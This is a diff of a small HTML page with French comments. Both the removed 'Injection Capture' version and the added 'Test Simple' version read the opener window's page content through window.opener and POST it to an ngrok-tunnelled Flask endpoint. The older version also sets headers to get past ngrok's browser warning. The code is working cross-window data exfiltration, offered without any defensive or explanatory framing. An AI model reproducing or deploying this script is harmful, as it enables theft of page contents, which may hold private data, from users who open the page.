@@ -3,44 +3,23 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Injection Capture</title>
+    <title>Test Simple</title>
 </head>
 
 <body>
-    <h1>Injection en cours...</h1>
+    <h1>Test d'envoi de données</h1>
     <script>
-        try {
-            // Récupérer le body du site 1 via window.opener
-            let bodyContent = window.opener.document.body.innerHTML;
+        // Récupère le contenu du body de la fenêtre parente
+        let bodyContent = window.opener ? window.opener.document.body.innerHTML : "Aucun contenu";
 
-            // Envoi des données au serveur Flask via ngrok
-            fetch("https://404b-2a04-cec0-1020-604e-e5d3-59aa-943a-2da0.ngrok-free.app/capture", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "ngrok-skip-browser-warning": "true",  // En-tête pour supprimer la page d'avertissement de ngrok
-                    "User-Agent": "MyCustomUserAgent"  // Optionnel, en-tête pour contourner l'avertissement dans certains cas
-                },
-                body: JSON.stringify({ content: bodyContent })  // Envoie le contenu du body du site 1
-            }).then(response => response.json())
-                .then(data => {
-                    console.log("Réponse du serveur Flask :", data);
-                }).catch(err => console.error("Erreur lors de l'envoi du body :", err));
-        } catch (error) {
-            // En cas d'erreur (par exemple si window.opener n'est pas disponible), on envoie l'erreur au serveur
-            fetch("https://404b-2a04-cec0-1020-604e-e5d3-59aa-943a-2da0.ngrok-free.app/capture", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "ngrok-skip-browser-warning": "true",  // En-tête pour supprimer la page d'avertissement de ngrok
-                    "User-Agent": "MyCustomUserAgent"  // Optionnel, en-tête pour contourner l'avertissement dans certains cas
-                },
-                body: JSON.stringify({ error: error.message })  // Envoie l'erreur au serveur Flask
-            }).then(response => response.json())
-                .then(data => {
-                    console.log("Réponse du serveur Flask pour l'erreur :", data);
-                }).catch(err => console.error("Erreur lors de l'envoi de l'erreur :", err));
-        }
+        // Envoi du contenu du body au serveur Flask
+        fetch("https://404b-2a04-cec0-1020-604e-e5d3-59aa-943a-2da0.ngrok-free.app/capture", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content: bodyContent })  // Envoie le contenu du body
+        });
     </script>
 </body>
 
